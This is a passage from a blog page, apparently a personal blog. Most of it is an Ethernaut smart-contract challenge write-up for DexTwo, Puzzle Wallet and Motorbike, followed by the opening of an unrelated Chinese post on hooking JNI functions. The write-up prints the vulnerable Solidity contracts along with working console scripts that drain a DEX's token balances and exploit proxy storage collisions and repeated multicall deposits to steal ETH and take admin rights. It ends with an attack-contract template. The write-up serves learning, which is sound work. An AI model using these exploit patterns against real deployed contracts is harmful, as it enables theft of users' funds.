class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 amount) external returns (bool) &#123;</span><br><span class="line">        _transfer(msg.sender, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 amount) external returns (bool) &#123;</span><br><span class="line">        uint256 allowed = allowance[from][msg.sender];</span><br><span class="line">        if (allowed != type(uint256).max) &#123;</span><br><span class="line">            require(allowed &gt;= amount, &quot;ALLOWANCE&quot;);</span><br><span class="line">            unchecked &#123; allowance[from][msg.sender] = allowed - amount; &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        _transfer(from, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transfer(address from, address to, uint256 amount) internal &#123;</span><br><span class="line">        require(to != address(0), &quot;ZERO_TO&quot;);</span><br><span class="line">        uint256 bal = balanceOf[from];</span><br><span class="line">        require(bal &gt;= amount, &quot;BAL&quot;);</span><br><span class="line">        unchecked &#123; balanceOf[from] = bal - amount; &#125;</span><br><span class="line">        balanceOf[to] += amount;</span><br><span class="line">        emit Transfer(from, to, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>The process of calling the function in the console is as follows: first approve the authorization, then extract</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">//  Withdraw token1/token2</span><br><span class="line">const token1 = await contract.token1();</span><br><span class="line">const token2 = await contract.token2();</span><br><span class="line"></span><br><span class="line">const provider = new _ethers.providers.Web3Provider(window.ethereum);</span><br><span class="line">await provider.send(&quot;eth_requestAccounts&quot;, []);</span><br><span class="line">const signer = provider.getSigner();</span><br><span class="line"></span><br><span class="line">const evil = new _ethers.Contract(</span><br><span class="line">  evilAddr,</span><br><span class="line">  [</span><br><span class="line">    &quot;function approve(address,uint256) returns (bool)&quot;,</span><br><span class="line">    &quot;function transfer(address,uint256) returns (bool)&quot;,</span><br><span class="line">    &quot;function balanceOf(address) view returns (uint256)&quot;</span><br><span class="line">  ],</span><br><span class="line">  signer</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">// Authorize DexTwo to spend your EVIL (very important!)</span><br><span class="line">await evil.approve(instance, _ethers.constants.MaxUint256);</span><br><span class="line"></span><br><span class="line">// Transfer 1 EVIL to DexTwo first, to establish the denominator = 1</span><br><span class="line">await evil.transfer(instance, 1);</span><br><span class="line"></span><br><span class="line">let rFrom = await evil.balanceOf(instance);   // Read the EVIL currently held by Dex (should be 1)</span><br><span class="line">await contract.swap(evilAddr, token1, rFrom); // amount=1, take all token1 at once</span><br><span class="line"></span><br><span class="line">rFrom = await evil.balanceOf(instance);       // Reread! This should be 2</span><br><span class="line">await contract.swap(evilAddr, token2, rFrom); // amount=2，take all token2 at once</span><br><span class="line"></span><br><span class="line">// check it out (both sides should be &quot;0&quot;)</span><br><span class="line">(await contract.balanceOf(token1, instance)).toString();</span><br><span class="line">(await contract.balanceOf(token2, instance)).toString();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/2025/10/14/Ethernaut-Challenges/swap_flow.png" class="" title="swap_flow.png">

<img src="/2025/10/14/Ethernaut-Challenges/uniswap_v2_swap_timeline.png" class="" title="uniswap_v2_swap_timeline.png">

<p>The above is a process of swap</p>
<h3 id="Puzzle-Wallet"><a href="#Puzzle-Wallet" class="headerlink" title="Puzzle Wallet"></a>Puzzle Wallet</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../helpers/UpgradeableProxy-08.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract PuzzleProxy is UpgradeableProxy &#123;</span><br><span class="line">    address public pendingAdmin;</span><br><span class="line">    address public admin;</span><br><span class="line"></span><br><span class="line">    constructor(address _admin, address _implementation, bytes memory _initData)</span><br><span class="line">        UpgradeableProxy(_implementation, _initData)</span><br><span class="line">    &#123;</span><br><span class="line">        admin = _admin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyAdmin() &#123;</span><br><span class="line">        require(msg.sender == admin, &quot;Caller is not the admin&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function proposeNewAdmin(address _newAdmin) external &#123;</span><br><span class="line">        pendingAdmin = _newAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123;</span><br><span class="line">        require(pendingAdmin == _expectedAdmin, &quot;Expected new admin by the current admin is not the pending admin&quot;);</span><br><span class="line">        admin = pendingAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function upgradeTo(address _newImplementation) external onlyAdmin &#123;</span><br><span class="line">        _upgradeTo(_newImplementation);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract PuzzleWallet &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 public maxBalance;</span><br><span class="line">    mapping(address =&gt; bool) public whitelisted;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function init(uint256 _maxBalance) public &#123;</span><br><span class="line">        require(maxBalance == 0, &quot;Already initialized&quot;);</span><br><span class="line">        maxBalance = _maxBalance;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyWhitelisted() &#123;</span><br><span class="line">        require(whitelisted[msg.sender], &quot;Not whitelisted&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123;</span><br><span class="line">        require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);</span><br><span class="line">        maxBalance = _maxBalance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addToWhitelist(address addr) external &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Not the owner&quot;);</span><br><span class="line">        whitelisted[addr] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable onlyWhitelisted &#123;</span><br><span class="line">        require(address(this).balance &lt;= maxBalance, &quot;Max balance reached&quot;);</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;);</span><br><span class="line">        balances[msg.sender] -= value;</span><br><span class="line">        (bool success,) = to.call&#123;value: value&#125;(data);</span><br><span class="line">        require(success, &quot;Execution failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123;</span><br><span class="line">        bool depositCalled = false;</span><br><span class="line">        for (uint256 i = 0; i &lt; data.length; i++) &#123;</span><br><span class="line">            bytes memory _data = data[i];</span><br><span class="line">            bytes4 selector;</span><br><span class="line">            assembly &#123;</span><br><span class="line">                selector := mload(add(_data, 32))</span><br><span class="line">            &#125;</span><br><span class="line">            if (selector == this.deposit.selector) &#123;</span><br><span class="line">                require(!depositCalled, &quot;Deposit can only be called once&quot;);</span><br><span class="line">                // Protect against reusing msg.value</span><br><span class="line">                depositCalled = true;</span><br><span class="line">            &#125;</span><br><span class="line">            (bool success,) = address(this).delegatecall(data[i]);</span><br><span class="line">            require(success, &quot;Error while delegating call&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The core of the vulnerability here is that delegatecall inherits the msg.value at the moment of the call. No matter how many times it is called, the actual balance of the proxy contract will not change. However, if you use delegatecall to call deposit multiple times, a false accounting vulnerability will occur.</p>
<p>At the same time, since the proxy contract calls delegatecall, the storage slot of the proxy contract is used. The owner and maxBalance of PuzzleWallet are written to the pendingAdmin and admin positions of the proxy.</p>
<p>Using this, we can whitelist the attacker’s address and then proceed with the attack described in step 1.</p>
<p>The attack flow is as follows:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">const instance = &quot;0xProxyAddress&quot;;      </span><br><span class="line">const player   = &quot;0xYourEOA&quot;;</span><br><span class="line"></span><br><span class="line">const proxyAbi  = [</span><br><span class="line">  &quot;function proposeNewAdmin(address _newAdmin) external&quot;,</span><br><span class="line">  &quot;function admin() public view returns (address)&quot;</span><br><span class="line">];</span><br><span class="line">const walletAbi = [</span><br><span class="line">  &quot;function addToWhitelist(address) external&quot;,</span><br><span class="line">  &quot;function deposit() external payable&quot;,</span><br><span class="line">  &quot;function multicall(bytes[] calldata) external payable&quot;,</span><br><span class="line">  &quot;function execute(address to, uint256 value, bytes calldata data) external payable&quot;,</span><br><span class="line">  &quot;function setMaxBalance(uint256) external&quot;,</span><br><span class="line">  &quot;function balances(address) external view returns (uint256)&quot;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">const proxy   = new web3.eth.Contract(proxyAbi,  instance);</span><br><span class="line">const wallet  = new web3.eth.Contract(walletAbi, instance);</span><br><span class="line"></span><br><span class="line">// Use Proxy to write slot0 → Let the owner from the Wallet perspective = player</span><br><span class="line">await proxy.methods.proposeNewAdmin(player).send(&#123;from: player&#125;);</span><br><span class="line"></span><br><span class="line">// Now use Wallet ABI to adjust Proxy and add whitelist to yourself</span><br><span class="line">await wallet.methods.addToWhitelist(player).send(&#123;from: player&#125;);</span><br><span class="line"></span><br><span class="line">// Construct a &quot;nested multicall&quot; to record the same msg.value N times (in this example, N=3)</span><br><span class="line">const dep = wallet.methods.deposit().encodeABI();</span><br><span class="line">function buildNestedMulticall(N) &#123;</span><br><span class="line">  if (N &lt;= 1) return [dep];</span><br><span class="line">  let inner = [dep];</span><br><span class="line">  for (let i = 2; i &lt;= N; i++) &#123;</span><br><span class="line">    inner = [dep, wallet.methods.multicall(inner).encodeABI()];</span><br><span class="line">  &#125;</span><br><span class="line">  return inner;</span><br><span class="line">&#125;</span><br><span class="line">const dataN = buildNestedMulticall(3); // Just change the number: repeat the account N times</span><br><span class="line"></span><br><span class="line">// Only transfer 0.001 ETH once, but increase balances[player] N times</span><br><span class="line">await wallet.methods.multicall(dataN).send(&#123;</span><br><span class="line">  from:  player,</span><br><span class="line">  value: web3.utils.toWei(&quot;0.001&quot;, &quot;ether&quot;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">(await wallet.methods.balances(player).call()).toString();</span><br><span class="line"></span><br><span class="line">// Withdraw all of the Proxy&#x27;s real ETH balance (must be cleared to 0 before settingMaxBalance)</span><br><span class="line">const bal = await web3.eth.getBalance(instance);</span><br><span class="line">if (bal !== &quot;0&quot;) &#123;</span><br><span class="line">  await wallet.methods.execute(player, bal, &quot;0x&quot;).send(&#123;from: player&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">await web3.eth.getBalance(instance); // should return &quot;0&quot;</span><br><span class="line"></span><br><span class="line">// Write slot1 → Set admin to yourself (write the address as uint256, the lower 160 bits are your address)</span><br><span class="line">await wallet.methods.setMaxBalance(web3.utils.toBN(player)).send(&#123;from: player&#125;);</span><br><span class="line"></span><br><span class="line">await proxy.methods.admin().call();  // should be player</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Motorbike"><a href="#Motorbike" class="headerlink" title="Motorbike"></a>Motorbike</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity &lt;0.7.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06/utils/Address.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-06/proxy/Initializable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Motorbike &#123;</span><br><span class="line">    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span><br><span class="line">    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class="line"></span><br><span class="line">    struct AddressSlot &#123;</span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.</span><br><span class="line">    constructor(address _logic) public &#123;</span><br><span class="line">        require(Address.isContract(_logic), &quot;ERC1967: new implementation is not a contract&quot;);</span><br><span class="line">        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;</span><br><span class="line">        (bool success,) = _logic.delegatecall(abi.encodeWithSignature(&quot;initialize()&quot;));</span><br><span class="line">        require(success, &quot;Call failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Delegates the current call to `implementation`.</span><br><span class="line">    function _delegate(address implementation) internal virtual &#123;</span><br><span class="line">        // solhint-disable-next-line no-inline-assembly</span><br><span class="line">        assembly &#123;</span><br><span class="line">            calldatacopy(0, 0, calldatasize())</span><br><span class="line">            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)</span><br><span class="line">            returndatacopy(0, 0, returndatasize())</span><br><span class="line">            switch result</span><br><span class="line">            case 0 &#123; revert(0, returndatasize()) &#125;</span><br><span class="line">            default &#123; return(0, returndatasize()) &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Fallback function that delegates calls to the address returned by `_implementation()`.</span><br><span class="line">    // Will run if no other function in the contract matches the call data</span><br><span class="line">    fallback() external payable virtual &#123;</span><br><span class="line">        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Returns an `AddressSlot` with member `value` located at `slot`.</span><br><span class="line">    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r_slot := slot</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Engine is Initializable &#123;</span><br><span class="line">    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span><br><span class="line">    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class="line"></span><br><span class="line">    address public upgrader;</span><br><span class="line">    uint256 public horsePower;</span><br><span class="line"></span><br><span class="line">    struct AddressSlot &#123;</span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function initialize() external initializer &#123;</span><br><span class="line">        horsePower = 1000;</span><br><span class="line">        upgrader = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Upgrade the implementation of the proxy to `newImplementation`</span><br><span class="line">    // subsequently execute the function call</span><br><span class="line">    function upgradeToAndCall(address newImplementation, bytes memory data) external payable &#123;</span><br><span class="line">        _authorizeUpgrade();</span><br><span class="line">        _upgradeToAndCall(newImplementation, data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Restrict to upgrader role</span><br><span class="line">    function _authorizeUpgrade() internal view &#123;</span><br><span class="line">        require(msg.sender == upgrader, &quot;Can&#x27;t upgrade&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.</span><br><span class="line">    function _upgradeToAndCall(address newImplementation, bytes memory data) internal &#123;</span><br><span class="line">        // Initial upgrade and setup call</span><br><span class="line">        _setImplementation(newImplementation);</span><br><span class="line">        if (data.length &gt; 0) &#123;</span><br><span class="line">            (bool success,) = newImplementation.delegatecall(data);</span><br><span class="line">            require(success, &quot;Call failed&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Stores a new address in the EIP1967 implementation slot.</span><br><span class="line">    function _setImplementation(address newImplementation) private &#123;</span><br><span class="line">        require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;);</span><br><span class="line"></span><br><span class="line">        AddressSlot storage r;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r_slot := _IMPLEMENTATION_SLOT</span><br><span class="line">        &#125;</span><br><span class="line">        r.value = newImplementation;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>As mentioned earlier, when contract A calls contract B via delegatecall, the data is written to contract A’s storage slot.</p>
<p>So the problem here is that the Engine contract hasn’t been fully initialized. Its upgrader and horsePower are both at their default values.</p>
<p>So here we can manually call the initialize function of Engine to set the upgrader to ourselves, then call the upgradeToAndCall function and use delegatecall to trigger selfdestruct(). There is a problem here:</p>
<p><strong>EIP-6780 changed the semantics of <code>SELFDESTRUCT</code>:</strong></p>
<p>Unless the contract is created and self-destructed in the same transaction, <code>selfdestruct</code> will no longer clear the bytecode&#x2F;storage, but will only transfer the balance.</p>
<p>Therefore, we can only destroy it when initializing the engine (make sure it’s in the same transaction).</p>
<p>check this <a target="_blank" rel="noopener" href="https://github.com/Ching367436/ethernaut-motorbike-solution-after-decun-upgrade/">https://github.com/Ching367436/ethernaut-motorbike-solution-after-decun-upgrade/</a></p>
<h3 id="DoubleEntryPoint"><a href="#DoubleEntryPoint" class="headerlink" title="DoubleEntryPoint"></a>DoubleEntryPoint</h3><p>Waiting for update</p>
<h2 id="Attack-Template"><a href="#Attack-Template" class="headerlink" title="Attack Template"></a>Attack Template</h2><p>deploy on sepolia testnet</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge create Attack --rpc-url https://sepolia.infura.io/v3/xx --private-key 0xxx --broadcast -vvv</span><br></pre></td></tr></table></figure>

<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Get the provider injected by Metamask</span></span><br><span class="line"><span class="keyword">const</span> provider = <span class="keyword">new</span> _ethers.<span class="title class_">BrowserProvider</span>(<span class="variable language_">window</span>.<span class="property">ethereum</span>);</span><br><span class="line"><span class="comment">// v5 is called Web3Provider, v6 is called BrowserProvider</span></span><br><span class="line"><span class="comment">//const provider = new _ethers.providers.Web3Provider(window.ethereum);</span></span><br><span class="line"><span class="keyword">const</span> signer = <span class="keyword">await</span> provider.<span class="title function_">getSigner</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// ABI of attack contract</span></span><br><span class="line"><span class="keyword">const</span> attack = <span class="keyword">new</span> _ethers.<span class="title class_">Contract</span>(</span><br><span class="line">  <span class="string">&quot;0xYourAttackContractAddress&quot;</span>,</span><br><span class="line">  [</span><br><span class="line">    <span class="string">&quot;function exploit() payable&quot;</span>,</span><br><span class="line">    <span class="string">&quot;function sweep(address to) external&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  signer</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// attack</span></span><br><span class="line"><span class="keyword">await</span> attack.<span class="title function_">exploit</span>(&#123;</span><br><span class="line">  <span class="attr">value</span>: _ethers.<span class="property">utils</span>.<span class="title function_">parseEther</span>(<span class="string">&quot;0.0005&quot;</span>)</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// await solver.pwn(engine, &#123; gasLimit: 1_000_000 &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> attack.<span class="title function_">sweep</span>(<span class="keyword">await</span> signer.<span class="title function_">getAddress</span>());</span><br><span class="line"></span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://2298233831.github.io/2022/11/30/JNI%E5%87%BD%E6%95%B0%E7%9A%84Hook%E4%B8%8E%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yu4n">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="The Blog of Yu4n">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/30/JNI%E5%87%BD%E6%95%B0%E7%9A%84Hook%E4%B8%8E%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D/" class="post-title-link" itemprop="url">JNI函数的Hook与快速定位</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-11-30 17:24:54" itemprop="dateCreated datePublished" datetime="2022-11-30T17:24:54+08:00">2022-11-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-10-14 23:23:22" itemprop="dateModified" datetime="2025-10-14T23:23:22+08:00">2025-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reverse/" itemprop="url" rel="index"><span itemprop="name">Reverse</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="JNI函数的Hook与快速定位"><a href="#JNI函数的Hook与快速定位" class="headerlink" title="JNI函数的Hook与快速定位"></a>JNI函数的Hook与快速定位</h1><p><strong>示例应用的so文件加载时机是在一些按钮被点击后才加载，注意</strong></p>
<h3 id="第一步也是要先得到JNI函数的地址，有两种方式"><a href="#第一步也是要先得到JNI函数的地址，有两种方式" class="headerlink" title="第一步也是要先得到JNI函数的地址，有两种方式"></a>第一步也是要先得到JNI函数的地址，有两种方式</h3><ol>
<li>枚举libart的符号表，得到对应的JNI函数地址后Hook</li>
<li>通过计算地址的方式来Hook，比较麻烦：先得到JNEnv结构体的地址，再通过偏移得到对应JNI函数指针的地址，最后通过指针得到JNI函数的地址。需要注意的是**32位(4字节)<strong>和</strong>64位(8字节)**的指针长度不同会导致偏移地址不同</li>
</ol>
<p>如果用C&#x2F;C++开发so文件，JNIEnv*指针变量最终都指向JNINativePoniter结构体。</p>
